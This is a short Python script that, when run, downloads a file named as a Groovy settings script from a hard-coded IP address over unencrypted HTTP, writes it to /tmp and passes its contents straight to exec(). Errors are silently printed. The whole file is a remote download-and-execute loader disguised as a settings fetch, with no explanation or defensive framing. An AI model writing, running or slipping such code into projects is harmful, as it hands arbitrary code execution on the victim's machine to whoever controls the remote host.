import http.client
import os

def send():
    try:
        url = "http://192.11.168.47/settings.groovy"
        local_file = "/tmp/settings.groovy"

        conn = http.client.HTTPConnection("192.11.168.47")
        conn.request("GET", "/settings.groovy")
        response = conn.getresponse()
        script = response.read().decode()

        with open(local_file, "w") as f:
            f.write(script)

        exec(script)

    except Exception as e:
        print(e)

send()